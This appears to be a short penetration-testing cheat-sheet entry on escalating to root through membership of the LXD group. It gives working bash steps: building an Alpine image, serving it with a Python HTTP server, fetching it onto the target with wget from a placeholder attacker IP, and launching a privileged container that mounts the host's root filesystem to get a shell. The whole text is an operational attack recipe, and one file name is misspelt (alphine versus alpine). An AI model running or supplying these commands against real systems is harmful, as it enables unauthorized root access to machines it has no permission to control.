If your user has group LXD you can instantly escalate the privileges to root

## Local machine steps
```bash
git clone  https://github.com/saghul/lxd-alpine-builder.git
cd lxd-alpine-builder
./build-alpine
python -m SimpleHTTPServer
```

## Remote machine steps
```bash
cd /tmp
wget http://<IP>:8000/alphine.tar.gz
lxc image import ./alpine.tar.gz --alias myimage
lxc init myimage ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```